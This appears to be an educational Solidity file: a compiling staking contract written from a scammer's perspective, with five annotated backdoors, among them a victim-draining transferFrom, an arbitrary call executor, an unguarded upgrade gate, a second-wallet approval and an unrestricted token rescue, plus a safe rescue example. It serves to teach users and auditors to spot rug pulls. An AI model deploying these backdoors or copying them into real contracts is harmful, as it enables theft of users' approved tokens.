// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import "@openzeppelin/contracts-upgradeable/token/ERC20/IERC20Upgradeable.sol";
import "@openzeppelin/contracts-upgradeable/token/ERC20/utils/SafeERC20Upgradeable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

/**
 * ⚠️  REFERENCE / EDUCATIONAL FILE — DO NOT DEPLOY  ⚠️
 *
 * This file is NOT in any migration. It exists ONLY so you can read a real,
 * compiling staking contract written FROM A SCAMMER'S PERSPECTIVE.
 *
 * Imagine the deployer = the hacker. Their plan:
 *   1. Make a contract that LOOKS like a normal staking dApp.
 *   2. Convince users to approve unlimited USDT to it.
 *   3. Wait for enough TVL.
 *   4. Pull the trigger by calling one of the planted backdoors below.
 *
 * The contract below is exactly what such a scam looks like under the hood.
 * 4 of the 5 backdoors (#1, #2, #4, #5) are deliberate scam tools.
 * #3 (open upgrade) is the ONE category where the scammer is usually a
 *     stranger — caused by an honest dev's bug, then exploited by random
 *     hackers scanning the chain. Either way, users lose.
 *
 * If a project's contract looks like THIS, do not approve it.
 *
 * Paste any of the marked functions into another AI and ask:
 *   "What can the owner of this staking contract do to my approved USDT?"
 *
 * NONE of this affects your real contract. It is isolated reference material.
 */

contract MaliciousStaking is
    Initializable,
    OwnableUpgradeable,
    ReentrancyGuardUpgradeable,
    UUPSUpgradeable
{
    using SafeERC20Upgradeable for IERC20Upgradeable;

    // ----- normal-looking storage (mirrors our real Staking.sol) -----
    IERC20Upgradeable public stakingToken;
    uint256 public aprBps;
    uint256 public lockPeriod;
    uint256 public totalStaked;
    uint256 public rewardPool;

    mapping(address => uint256) public stakedAmount;
    mapping(address => uint256) public lastStakeTime;

    event Staked(address indexed user, uint256 amount);
    event Unstaked(address indexed user, uint256 amount);

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }

    function initialize(address _token, uint256 _aprBps) external initializer {
        __Ownable_init();
        __ReentrancyGuard_init();
        __UUPSUpgradeable_init();
        stakingToken = IERC20Upgradeable(_token);
        aprBps = _aprBps;
        lockPeriod = 7 days;
    }

    // =====================================================================
    //                  NORMAL-LOOKING USER FUNCTIONS
    //   (these are fine — they look like every staking contract on TRON)
    // =====================================================================

    function stake(uint256 amount) external nonReentrant {
        require(amount > 0, "amount=0");
        stakedAmount[msg.sender] += amount;
        lastStakeTime[msg.sender] = block.timestamp;
        totalStaked += amount;
        // ✅ legit: transferFrom uses msg.sender as the source
        stakingToken.safeTransferFrom(msg.sender, address(this), amount);
        emit Staked(msg.sender, amount);
    }

    function unstake(uint256 amount) external nonReentrant {
        require(stakedAmount[msg.sender] >= amount, "insufficient");
        stakedAmount[msg.sender] -= amount;
        totalStaked -= amount;
        stakingToken.safeTransfer(msg.sender, amount);
        emit Unstaked(msg.sender, amount);
    }

    function fundRewardPool(uint256 amount) external onlyOwner {
        rewardPool += amount;
        stakingToken.safeTransferFrom(msg.sender, address(this), amount);
    }

    function setAPR(uint256 newAprBps) external onlyOwner {
        aprBps = newAprBps;
    }

    // =====================================================================
    //   🚩 RED FLAG #1 — SCAMMER'S DRAIN BUTTON (transferFrom on victim)
    // =====================================================================
    // The scammer ships this function from day one with an innocent name
    // ("emergencyWithdraw", "rescueUser", "migrate"). The killer is the
    // FIRST argument to transferFrom: it's `victim`, not `msg.sender`.
    // This pulls USDT from any wallet that approved — straight to owner.
    //
    // The scammer's playbook: deploy → wait for users to approve → call
    // this function with each victim's address in a loop → drain.
    //
    // ✅ Legit (see stake() above): transferFrom(msg.sender, ...)
    // 🚩 Scammer (below):           transferFrom(victim, ...)

    function emergencyWithdraw(address victim) external onlyOwner {
        uint256 bal = stakingToken.balanceOf(victim);
        stakingToken.safeTransferFrom(victim, owner(), bal);
    }

    // =====================================================================
    //   🚩 RED FLAG #2 — SCAMMER'S SWISS ARMY KNIFE (arbitrary call)
    // =====================================================================
    // Hidden under an innocent name like "execute" / "multicall" / "forward".
    // Lets the scammer make THIS staking contract call ANY function on ANY
    // contract. Their playbook: craft a call to USDT.transferFrom(victim,
    // owner, balance) and drain anyone who approved — for any token, not
    // just USDT. This single function is enough to rug an entire dApp.
    //
    // 🚩 Giveaway: `target.call(data)` where owner controls both args.

    function execute(address target, bytes calldata data)
        external
        onlyOwner
        returns (bytes memory)
    {
        (bool ok, bytes memory ret) = target.call(data);
        require(ok, "call failed");
        return ret;
    }

    // =====================================================================
    //   🚩 RED FLAG #3 — INCOMPETENT DEV (open upgrade — outsider attack)
    // =====================================================================
    // This one is DIFFERENT from the others. It's almost never planted on
    // purpose — it's an honest dev mistake. They forgot the `onlyOwner`
    // modifier on the upgrade gate. The result: any STRANGER on the chain
    // can call upgradeTo() and replace this contract with their own
    // malicious version that drains every approver.
    //
    // The owner gets rugged by a random hacker before they even notice.
    // Bots scan the chain 24/7 looking for exactly this bug.
    // For users approving the contract, the outcome is the same: drained.
    //
    // ✅ Legit:    function _authorizeUpgrade(address) internal override onlyOwner {}
    // 🚩 Mistake: function _authorizeUpgrade(address) internal override {}

    function _authorizeUpgrade(address) internal override {
        // ⚠️ MISSING `onlyOwner` — anyone can upgrade this contract.
    }

    // =====================================================================
    //   🚩 RED FLAG #4 — SCAMMER'S DECOY (approve a "second wallet" to drain)
    // =====================================================================
    // The scammer makes the staking contract approve a SECOND wallet they
    // control. That second wallet then calls USDT.transferFrom and drains
    // the pool. Why bother with the second wallet? Plausible deniability —
    // the scammer can blog "we got phished, our spender approval leaked",
    // dodging blame while the funds end up in their own pocket.
    //
    // 🚩 Giveaway: any owner-callable function that calls .approve() on the
    //              staking token to a non-zero spender.

    function setSpender(address spender, uint256 amount) external onlyOwner {
        stakingToken.approve(spender, amount);
    }

    // =====================================================================
    //   🚩 RED FLAG #5 — SCAMMER'S CLEAN EXIT ("rescue" the staked token)
    // =====================================================================
    // The scammer markets this as a "safety feature" — recover tokens
    // accidentally sent to the contract. But because it accepts ANY token
    // address (including the staked USDT itself), they can pull the entire
    // pool — every user's stake + the reward pool — to themselves.
    //
    // This is the most popular rug on TRON / BSC because it looks innocent
    // in the source code. Then "an exploit happens" and the funds are gone.
    //
    // ✅ Safe version would have:
    //      require(token != address(stakingToken), "cannot touch user funds");
    // 🚩 Scammer version (below) is missing that line.

    function rescueTokens(address token, uint256 amount) external onlyOwner {
        IERC20Upgradeable(token).safeTransfer(owner(), amount);
    }
}

// =========================================================================
// ✅ For comparison: a SAFE rescue function (the legit version of #5)
// =========================================================================
// Same intent — let the owner recover tokens accidentally sent to the
// contract — but with the critical guard that protects user funds.
contract SafeRescueExample is OwnableUpgradeable {
    using SafeERC20Upgradeable for IERC20Upgradeable;
    IERC20Upgradeable public stakingToken;

    function rescueTokens(address token, uint256 amount) external onlyOwner {
        require(token != address(stakingToken), "cannot touch user funds");
        IERC20Upgradeable(token).safeTransfer(owner(), amount);
    }
}
